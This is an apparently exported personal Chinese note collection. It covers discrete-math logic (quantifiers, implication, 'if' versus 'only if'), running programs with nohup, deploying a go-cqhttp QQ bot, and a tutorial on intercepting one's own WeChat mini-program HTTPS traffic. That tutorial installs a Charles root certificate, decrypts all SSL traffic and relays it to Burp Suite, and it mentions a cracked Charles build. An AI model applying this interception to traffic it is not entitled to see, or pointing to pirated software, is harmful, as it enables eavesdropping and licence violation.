<p>$\forall x(M(x)\wedge F(x)) \iff \forall xM(x)\wedge \forall F(x)$。这意味着：宇宙所有的生物都是人，并且都呼吸。</p>
</blockquote>
<blockquote>
<p>「善意的推定」详见：<a href="#3449001268" title="「蕴含」与「等价」自然语言表达的理解" class="record-link ">「蕴含」与「等价」自然语言表达的理解</a> 脚注。</p>
</blockquote>
<table>
<thead>
<tr>
<th>有的人用左手写字</th>
<th>M(x)</th>
<th>G(x)</th>
<th>表达式真值</th>
<th>我们认为应该的真值</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>$\exists x (M(x)\wedge G(x))$</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>理所当然。</td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>x</td>
<td>0</td>
<td>0</td>
<td>我们必须存在这样的人。</td>
</tr>
<tr>
<td></td>
<td>x</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>G(x) 为假就表示了：没有人用左手写字。</td>
</tr>
<tr>
<td>$\exists x(M(x)\to G(x))$</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>G(x) 为假就表示了：没有人用左手写字。</td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>x</td>
<td><strong>1</strong></td>
<td><strong>0</strong></td>
<td>宇宙连人都没有，但是表达式的真值真。或者说，我们找到了一个外星生物，表达式告诉我们这就是真。<strong>这显然违背了 c.中的讨论。</strong></td>
</tr>
</tbody>
</table>
<blockquote>
<p>有没有办法让 $\exists x(M(x)\to G(x))$ 正确？有，只要让 x 论域为人即可。这样 M(x) 就永真了。起作用的变成了 $G(x)$，也就让命题变成了 $\exists xG(x)$，相当于例题中（a）2.的答案。</p>
</blockquote>
<h1>课后例题</h1>
<p>下面我们可以尝试再做一道例题体会体会。</p>
<blockquote>
<p>[!example] 例子：在⼀阶逻辑中将下列命题符号化<br>
（1）火车都比轮船快。<br>
（2）有的火车比有的汽⻋快<br>
（3）不存在比所有火车都快的汽车。<br>
（4）说凡是汽车就比火车慢是不对的</p>
<p>解：</p>
<ol>
<li>F(x)：x是火车；G(y)：y是轮船；H(x,y)：x比y快。$\forall x\forall y(F(x)\wedge G(y)\to H(x,y))$</li>
<li>F(x)：x是火车；G(y)：y是汽车；H(x,y)：x比y快。$\exists x\exists y(F(x)\wedge G(y)\wedge H(x,y))$</li>
<li>F(x)：x是汽车；G(y)：y是火车；H(x,y)：x比y快。$\neg \exists x(F(x)\wedge \forall y(G(y)\to H(x,y)))$</li>
<li>F(x)：x是汽车；G(y)：y是火车；H(x,y)：x比y快。$\neg \forall x\forall y(F(x)\wedge G(y)\to H(x,y))$</li>
</ol>
</blockquote>
<h1>本文参考</h1>
<ul>
<li>左孝凌等人主编的《离散数学》</li>
<li>屈婉玲等人主编的《离散数学》第 2 版</li>
<li><a href="https://www.zhihu.com/question/27155054">离散数学中，为什么在表示“所有人···”的时候使用蕴涵式，在表达“有的人···”的时候使用合取式？ - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3449001268">
                            <a href="#3449001268">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_数学与算法);">⬤</span>
                                    
                                </span>
                                
                                <span>「蕴含」与「等价」自然语言表达的理解</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>「善意的推定」详见：<a href="#3449001268" title="「蕴含」与「等价」自然语言表达的理解" class="record-link highlight">「蕴含」与「等价」自然语言表达的理解</a> 脚注。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="3449001268" class="record">
            <header>
                <h1 class="record-title">「蕴含」与「等价」自然语言表达的理解</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>数学与算法</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('离散数学');">离散数学</button>
                    
                    <button class="btn" onclick="activeTag('命题逻辑');">命题逻辑</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/13/2024</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>cd939534</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240413152554.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>里面解释了「当」和「仅当」的区别</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>联结词中的蕴含和等价</h1>
<p>用真值表起个头：</p>
<table>
<thead>
<tr>
<th>P</th>
<th>Q</th>
<th>蕴含 $P\to Q$</th>
<th>等价 $P\leftrightarrow Q$</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td><strong>0</strong></td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
<p>蕴含（条件 [^yh]）：</p>
<ul>
<li>在蕴含式「如果 p 则 q」中，记作 $p\to q$[^yhfh]，p 称为蕴含式的前件，q 称为蕴含式的后件。</li>
<li>q 是 p 的必要条件，p 是 q 的充分条件</li>
<li>当且仅当 p 为 T，q 为 F 时，$p\to q$ 为 F。[^sy]</li>
<li>p 和 q 可以没有因果关系</li>
</ul>
<p>等价（双条件）：</p>
<ul>
<li>$p\leftrightarrow q$ [^stj] 表示的基本逻辑关系：p 与 q 互为充分必要条件，相当于 $(p\to q)\wedge (q\to p)$</li>
<li>p 仅当 q 可译为 $p\to q$</li>
<li>p 当 q 可译为 $q\to p$</li>
<li>p 当且仅当 q 译为 $p\leftrightarrow q$</li>
<li>等价联结词连接的两个命题之间可以没有因果关系。</li>
</ul>
<p>[^yh]: 在左孝凌主编的《离散数学》（P20-P22）中，「蕴含」一词有其他含义：当且仅当 $P\to Q$ 是一个重言式时，我们称「P 蕴含 Q」，并记作 $P\Rightarrow Q$。在研究生课程中没有刻意这样定义。仅给<strong>博主本人</strong>的提醒：有一个和它相似的概念「推理正确」，无论是研究生课程还是左孝凌的《离散数学》，「推理正确」定义相似。参考《离散数学》左孝凌 P20、P40。<br>
[^sy]: 「善意的推定」，即前提为 F 时，条件命题真值取 T。左孝凌《离散数学》P7。<br>
[^yhfh]: 联结词 $\to$ 亦可记作 $\supset$。<br>
[^stj]: 联结词 $\leftrightarrow$ 亦可记作 $\leftrightarrows$，或「iff」</p>
<p>「蕴含」的自然语言表述：“如果 p，则 q” 有很多不同的表述方法。</p>
<ul>
<li>若 p，就 q</li>
<li>只要 p，就 q</li>
<li>因为 p，所以 q</li>
<li><strong>p 仅当 q</strong></li>
<li><strong>只有 q，才 p</strong></li>
<li><strong>除非 q，才 p</strong> 或 <strong>除非 q，否则非 p</strong></li>
</ul>
<h1>「当」和「仅当」的理解</h1>
<p>英语中，当为 if，仅当为 only if。</p>
<p>下面对句子含义进行理解：</p>
<ul>
<li>p 当 q：$q\to p$
<ul>
<li>当 q 成立，p 必定成立。也就是说：如果 q 成立，p 成立。</li>
</ul>
</li>
<li>p 仅当 q：$p\to q$
<ul>
<li>当 q 成立，p<strong>可能</strong>成立，也<strong>可能</strong>不成立。只有 q 成立，p 才（可能）成立。</li>
<li>q 若不成立，p 绝对成立不了。</li>
<li>因此一看见 p 成立了 q 必定成立。</li>
</ul>
</li>
</ul>
<blockquote>
<p>[!example] 例子理解<br>
设 p 为我成功，q 为我努力。</p>
<ol>
<li>p 当 q：当我努力，我就成功。</li>
<li>p 仅当 q：仅当我努力时，我才会成功。</li>
</ol>
<p>尝试将这个例子代入上面的解释中。</p>
</blockquote>
<p>综上：「当」是「如果...则...」的关系。「仅当」是「只有...才...」的关系。</p>
<blockquote>
<p>这里也顺便解释了「只有...才...」和「除非...才...」。</p>
</blockquote>
<p>看下面的真值表前需要先理解下表中命题真值的含义。命题真值的值为 1 时，说明符合上面的解释；命题真值为 0，说明存在冲突。</p>
<p>真值表：</p>
<table>
<thead>
<tr>
<th>语境</th>
<th>p</th>
<th>q</th>
<th>命题真值</th>
<th>代入上面的解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>当</td>
<td></td>
<td></td>
<td>$q\to p$</td>
<td></td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>（善意的推定）</td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>当 q 成立，p 成立。<strong>与上面解释的意思相反，所以为假。</strong></td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>（善意的推定）</td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>当 q 成立，p 成立</td>
</tr>
<tr>
<td>仅当</td>
<td></td>
<td></td>
<td>$p\to q$</td>
<td></td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>q 若不成立，p 绝对成立不了。</td>
</tr>
<tr>
<td></td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>当 q 成立，p 可能成立，也可能不成立。</td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>p 成立了 q 肯定成立。<strong>与上面解释的意思相反，所以为假。</strong></td>
</tr>
<tr>
<td></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>当 q 成立，p 可能成立，也可能不成立。</td>
</tr>
</tbody>
</table>
<p>所以符号对「当」和「仅当」的解释是合理的。</p>
<h1>「除非...否则...」的理解</h1>
<p>上文提到“如果 p，则 q” 的表述方法中有一条：</p>
<ul>
<li><strong>除非 q，才 p</strong> 或 <strong>除非 q，否则非 p</strong></li>
</ul>
<p>「除非 q，否则 $\neg p$」理解为：</p>
<ul>
<li>「除非具备 q，如果不具备 q，则 $\neg p$」</li>
<li>意思就是「如果 $\neg q$，则 $\neg p$」</li>
<li>即 $\neg q \to \neg p \iff p\to q$。</li>
</ul>
<blockquote>
<p>[!example] 例子<br>
设 p 为我成功，q 为我努力。<br>
命题：除非你努力，否则你将失败。</p>
<p>解：</p>
<ul>
<li>可以理解为：如果你不努力，则你将失败。</li>
<li>翻译：$p\to q$</li>
</ul>
</blockquote>
<h1>案例练习</h1>
<blockquote>
<p>[!example] 例子：「蕴含」的自然语言表达<br>
设 p：天冷，q：小王穿羽绒服，将下列命题符号化<br>
(1) 只要天冷，小王就穿羽绒服。 $p\to q$<br>
(2) 因为天冷，所以小王穿羽绒服。 $p\to q$<br>
(3) 若小王不穿羽绒服，则天不冷。 $p\to q$<br>
(4) 只有天冷，小王才穿羽绒服。 $q\to p$<br>
(5) 除非天冷，小王才穿羽绒服。 $q\to p$<br>
(6) 除非小王穿羽绒服，否则天不冷。 $p\to q$<br>
(7) 如果天不冷，则小王不穿羽绒服。 $q\to p$<br>
(8) 小王穿羽绒服仅当天冷的时候。 $q\to p$<br>
提示：$\neg p \to \neg q$ 与 $q\to p$ 等值（真值相同，假言易位）</p>
</blockquote>
<blockquote>
<p>[!example] 例子：双条件命题案例<br>
<strong>燕子飞回南方，春天来了。</strong><br>
<strong>我们要学习好，为祖国的现代化建设而奋斗。</strong></p>
</blockquote>
<h1>本文参考</h1>
<ul>
<li>左孝凌等人主编的《离散数学》</li>
<li>屈婉玲等人主编的《离散数学》第 2 版</li>
<li>研究生课程课件部分内容、本科生课程部分笔记</li>
<li><a href="https://www.zhihu.com/question/27155054">离散数学中，为什么在表示“所有人···”的时候使用蕴涵式，在表达“有的人···”的时候使用合取式？ - 知乎 (zhihu.com)</a> 郭戴维的回答</li>
<li><a href="https://zhuanlan.zhihu.com/p/138532995">逻辑 ∣ 除非…否则…如何破解？ - 知乎 (zhihu.com)</a> 逻辑判断的回答</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2214581713">
                            <a href="#2214581713">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_数学与算法);">⬤</span>
                                    
                                </span>
                                
                                <span>为什么个体域变化引入特性谓词时，不同量词的命题变化不一样？</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>「善意的推定」详见：<a href="#3449001268" title="「蕴含」与「等价」自然语言表达的理解" class="record-link highlight">「蕴含」与「等价」自然语言表达的理解</a> 脚注。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1464127505" class="record">
            <header>
                <h1 class="record-title">对电脑端微信小程序抓包</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('微信小程序');">微信小程序</button>
                    
                    <button class="btn" onclick="activeTag('微信');">微信</button>
                    
                    <button class="btn" onclick="activeTag('Charles');">Charles</button>
                    
                    <button class="btn" onclick="activeTag('Burp');">Burp</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/17/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240417234049.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>关闸远离我</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>5744d011</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 免责声明<br>
本文提供的信息、技术内容和相关资源仅供学习和交流目的使用。严禁将本文中的任何内容用于非法活动或违反当地法律法规的行为。作者和发布者不对读者的不当使用承担任何责任。请读者遵守法律，合法使用文中信息。</p>
</blockquote>
<p>起因是我所住的宿舍水电费用得很快，不知道什么时候欠费就把闸给关了。我们交电费和查电费是通过微信小程序进行的，想想能不能抓到 API 地址，以后派爬虫定时去查。避免关闸情况的发生。</p>
<p>前期简单调研了解到直接通过电脑抓手机的包可能有点麻烦，现尝试能不能通过在电脑上登录小程序抓取我们需要的东西。</p>
<p>软件：</p>
<ul>
<li><a href="https://www.charlesproxy.com/latest-release/download.do">Charles</a>（30 天试用，应该有破解版）</li>
<li><a href="https://portswigger.net/burp/releases/professional-community-2024-2-1-5">Burp Suite</a>（下载社区版应该不要钱）</li>
</ul>
<p>首先看一下电脑端小程序能不能正常查询：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417230300.webp" alt="image.png|350"></p>
<h1>Charles</h1>
<p>如下图所示安装证书：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231307.webp" alt="image.png|500"></p>
<p>安装到受信任的根证书颁发机构：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231541.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231610.webp" alt="image.png"></p>
<p>接下来配置代理：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231656.webp" alt="image.png|350"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231721.webp" alt="image.png|500"></p>
<p>接下来配置 SSL 代理设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231753.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231842.webp" alt="image.png|500"></p>
<p><code>*</code> 是代表抓取任意端口和域名，如果只抓取固定的端口 or 域名可自行设置。</p>
<p>接下来配置将数据包代理到 BurpSuite：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417231941.webp" alt="image.png|450"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417232026.webp" alt="image.png"></p>
<p>注意，Web Proxy（HTTP）和 Secure Web Peoxy（HTTPS）都需要填写 127.0.0.1 以及端口（这里填的都是 8091），这和后续配置 BurpSuite 代{过}{滤}理的端口一致。</p>
<h1>Burp Suite</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417232205.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417232219.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417232714.webp" alt="image.png"></p>
<p>接下来你就可以在拦截历史中抓到包了：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417232835.webp" alt="image.png"></p>
<p>通过返回的数据可以精准定位我们需要的 GET 参数。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240417233412.webp" alt="image.png"></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/663596907">[Windows] 一个能用的微信小程序抓包方式（亲测） - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="888931094">
                            <a href="#888931094">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>go-cqhttp 部署与简单编程</span>
                                
                                <div class="record-links-context hover">
                                    <p>在 <a href="#1464127505" title="对电脑端微信小程序抓包" class="record-link highlight">之前的文章</a> 中提到，我需要每天查询宿舍水电费余额。抓到小程序查余额的接口后，我打算把消息通知到宿舍 QQ 群中（微信群机器人操作太麻烦，或者说只有企业群才有机器人）。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2445395019" class="record">
            <header>
                <h1 class="record-title">Linux 使用 nohup 后台运行程序</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('nohup');">nohup</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/18/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240418190126.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>保证自己的项目一直运行，不会因为关闭终端而结束</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>91c1c44b</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>nohu<strong>p</strong> 英文全称 no hang up（不挂起）。当我们把项目部署到服务器上时，只有一直保持 linux 终端的连接才能够运行项目，当我们把连接软件 Xshell 或者 Finalshell 连接工具关掉时，项目也就停止运行。只要用了 nohup 命令，我们的项目就能够一直运行了，此时就实现了我们需求。</p>
<blockquote>
<p>易错点：注意不是 nohub 😅😅😅。</p>
</blockquote>
<h1>检查</h1>
<p>查询 nohup 是否安装：</p>
<pre><code class="language-sh">which nohup
</code></pre>
<p>安装方法略。</p>
<h1>使用</h1>
<p>nohup 命令，在默认情况下（非重定向时），会输出一个名叫 nohup.out 的文件到当前目录下，如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。</p>
<p>语法格式：</p>
<pre><code class="language-sh">nohup Command [Arg...] [&amp;]
</code></pre>
<ul>
<li><code>nohup</code>：不挂断的运行，并没有后台运行的功能，使命令永久的执行下去，断开 SSH 连接不会影响他的运行。</li>
<li><code>Command</code>：要执行的命令。</li>
<li><code>Arg</code>：一些参数，可以指定输出文件。</li>
<li><code>&amp;</code>：让命令在后台执行，终端退出后命令仍旧执行。</li>
</ul>
<p>比如：</p>
<pre><code class="language-sh">nohup ./myscript.sh &amp;
</code></pre>
<p>在终端如果看到以下输出，并返回工作序号和 pid，说明运行成功：</p>
<pre><code class="language-text">[1] 166603
nohup: ignoring input and appending output to 'nohup.out'
</code></pre>
<p>输入 <code>jobs</code> 命令查看运行的工作：</p>
<pre><code class="language-sh">jobs
# [1]+  Running                 nohup java -jar ./demo-interface-0.0.1-SNAPSHOT.jar &amp;
</code></pre>
<p><code>nohup.out</code> 记录有启动日志：</p>
<pre><code class="language-sh">tail -500 nohup.out # 查看启动日志
</code></pre>
<p>若要停止运行，我们可以先找到进程号：</p>
<pre><code class="language-sh">ps -aux | grep &quot;myscript.sh&quot;
# a:显示所有程序
# u:以用户为主的格式来显示
# x:显示所有程序，不区分终端机
# 也可以使用 ps -def | grep &quot;myscript.sh&quot;
</code></pre>
<p>第一个号码就是 PID。接下来使用 <code>kill</code> 命令删除。</p>
<pre><code class="language-sh">kill -9 &lt;PID&gt;
# kill 程序可以向另外的进程发送任意的信号。上述命令表示发送信号9(SIGKILL)给指定的进程。
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/qq_45830276/article/details/126044645">Linux中安装和使用nohup命令_nohup安装-CSDN博客</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-nohup.html">Linux nohup 命令 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://baijiahao.baidu.com/s?id=1761537282329297979&amp;wfr=spider&amp;for=pc">linux常用功能——后台运行 (baidu.com)</a></li>
<li><a href="https://blog.csdn.net/cooldream2009/article/details/134990775">Linux中ps命令使用指南-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="888931094">
                            <a href="#888931094">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>go-cqhttp 部署与简单编程</span>
                                
                                <div class="record-links-context hover">
                                    <p>后台运行 go-cqhttp（参考 <a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link highlight">Linux 使用 nohup 后台运行程序</a>）：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2985240736">
                            <a href="#2985240736">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 项目的上线方式</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>关于 nohup 命令详看：<a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link highlight">Linux 使用 nohup 后台运行程序</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="888931094" class="record">
            <header>
                <h1 class="record-title">go-cqhttp 部署与简单编程</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('QQ');">QQ</button>
                    
                    <button class="btn" onclick="activeTag('cqhttp');">cqhttp</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('HTTP');">HTTP</button>
                    
                    <button class="btn" onclick="activeTag('Windows');">Windows</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/18/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240418211821.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>舍友用了都说好</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>34fc0316</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 免责声明<br>
本文提供的信息、技术内容和相关资源仅供学习和交流目的使用。严禁将本文中的任何内容用于非法活动或违反当地法律法规的行为。作者和发布者不对读者的不当使用承担任何责任。请读者遵守法律，合法使用文中信息。</p>
</blockquote>
<p>在 <a href="#1464127505" title="对电脑端微信小程序抓包" class="record-link ">之前的文章</a> 中提到，我需要每天查询宿舍水电费余额。抓到小程序查余额的接口后，我打算把消息通知到宿舍 QQ 群中（微信群机器人操作太麻烦，或者说只有企业群才有机器人）。</p>
<p>本文简要介绍 go-cqhttp 部署与编程思路，并实现一个简单的单向数据传输的 Demo。</p>
<h1>简述 QQ 机器人的曾经与未来</h1>
<p>酷 Q 是一款制造 QQ 聊天机器人的软件，主要功能是获取 QQ 的聊天消息，然后通过各种插件达到各种不同的功能。</p>
<p><a href="https://github.com/kyubotics/coolq-http-api">cqhttp</a> 是 2017 年初出现的基于 CKYU（一个 QQ 机器人插件平台，应该就是酷 Q）的一款开源免费插件，它使用户能够通过 HTTP 或 WebSocket 对 CKYU 的事件进行上报以及接收请求来调用 CKYU 的 DLL 接口，从而可以使用其它语言（不方便编译到原生二进制的语言）编写 CKYU 插件。在 CQHTTP 活跃开发和维护期间，有非常多的开发者使用 Python、Java、Node.js 等 web 开发常用语言基于 CQHTTP 插件编写各式各样的聊天机器人。</p>
<blockquote>
<p>2020 年晨风律师函事件发生，当年酷 Q 官网决定停运。<br>
cqhttp 项目在 2020 年归档，作者自述原因为无力维护。</p>
</blockquote>
<blockquote>
<p>[!cite] 愿我们能在更开放的平行世界里相遇。——酷 Q 官网</p>
</blockquote>
<p>在新的机器人平台 Mirai 开始发展、以及 CKYU 决定停运之后，为了让原来基于 CQHTTP 插件编写的机器人能够继续运行，一些开发者在其它机器人平台上编写了兼容 CQHTTP 接口的插件/模块。 go-cqhttp 是其中较为广泛使用的一个。</p>
<p><a href="https://github.com/Mrs4s/go-cqhttp">go-cqhttp</a> 是使用 <a href="https://github.com/mamoe/mirai">mirai</a> 以及 <a href="https://github.com/Mrs4s/MiraiGo">Mirai</a> 开发的 cqhttp golang 原生实现，并在 <a href="https://github.com/richardchien/coolq-http-api">cqhttp 原版</a> 的基础上做了部分修改和拓展。</p>
<p>但是以上均不是官方推出的机器人或接口。2020 年 4 月初，腾讯官方内测 Hoo!k 机器人，不久后下线。2023 年 7 月，腾讯 QQ Windows 全新 NT 架构 9.9.0 体验版已上架官网开放下载。</p>
<blockquote>
<p>go-cqhttp 作者在 2023 年发布 <a href="https://github.com/Mrs4s/go-cqhttp/issues/2471">声明</a>，称由于 QQ 官方针对协议库的围追堵截，作者本人已无力维护项目。</p>
</blockquote>
<blockquote>
<p>[!cite] 协议库的时代已经过去，接下来是 Hook 官方客户端的时代。——go-cqhttp 项目维护者 Mrs4s</p>
</blockquote>
<p>如今 2024 年 NTQQ 正式版诞生，官方正式推出「QQ 机器人」，称其可以直接打通「QQ 频道」「QQ 群」与个人。</p>
<h1>思路</h1>
<blockquote>
<p><a href="https://github.com/botuniverse/onebot">OneBot</a> 是统一的聊天机器人应用接口标准，旨在统一不同聊天平台上的机器人应用开发接口，使开发者只需编写一次业务逻辑代码即可应用到多种机器人平台。go-cqhttp 支持该协议。2020 年诞生。</p>
</blockquote>
<p>对于个人用户，官方的 QQ 机器人不能添加到群，故放弃此想法。go-cqhttp 虽停止维护，但是还能用，用这半个学期应该是可以的。我尝试了过使用基于 go-cqhttp 开发的 Python SDK（<a href="https://github.com/FengLiuFeseliud/pycqBot">pycqBot</a>），但不太好用。</p>
<p>使用 go-cqhttp 需要有一个小号，充当「机器人」。</p>
<p>项目离不开本地开发（我的电脑使用 Windows），定时任务离不开 Linux 服务器部署。</p>
<p>本地测试时信息流：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240418204224.webp" alt="image.png"></p>
<p>实际应用时的信息流：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240418204251.webp" alt="image.png"></p>
<h1>本地测试开发</h1>
<p>安装 go-cqhttp，它是一个可执行文件，直接下载下来就可以用。实测，不能使用账号密码登录，因此我们需要进行扫码登录。</p>
<p>刚刚下载好的 go-cqhttp 需要在命令行中执行一遍（不要鼠标双击）。通信方式选择 0。本地就会生成 <code>config.yml</code> 文件。</p>
<p>此时还不能扫码登录（报错：当前协议不支持二维码登录, 请配置账号密码登录）。看到目录会生成 <code>device.json</code> 文件，点进去，把 <code>&quot;protocol&quot;:6</code> 改成 <code>&quot;protocol&quot;:2</code>，就可以拿到二维码手机扫码登陆了。</p>
<p>接下来用机器人账号进行扫码即可。登录成功后，你可以先和大号建一个小群以供测试。</p>
<p><strong>注意到本地会生成一个 <code>session.token</code> 的文件，请保留。</strong></p>
<p>在浏览器或其它工具发送 GET 指令。（参考 <a href="">onebot-11/api/public.md at master · botuniverse/onebot-11 (github.com)</a>）</p>
<pre><code class="language-sh">http://127.0.0.1:5700/send_group_msg?group_id=&lt;QQ群群号&gt;&amp;message=hello_world
# 5700 是 go-cqhttp 开放的端口
</code></pre>
<p>群里收到机器人发送的 <code>hello_world</code> 即配置成功。</p>
<p>接下来写个 Python 脚本，用于查水电费，或者执行其它你想要的功能（比如使用 WebHook 推送）。这个脚本打算放在 Linux 服务器中运行。脚本实现：</p>
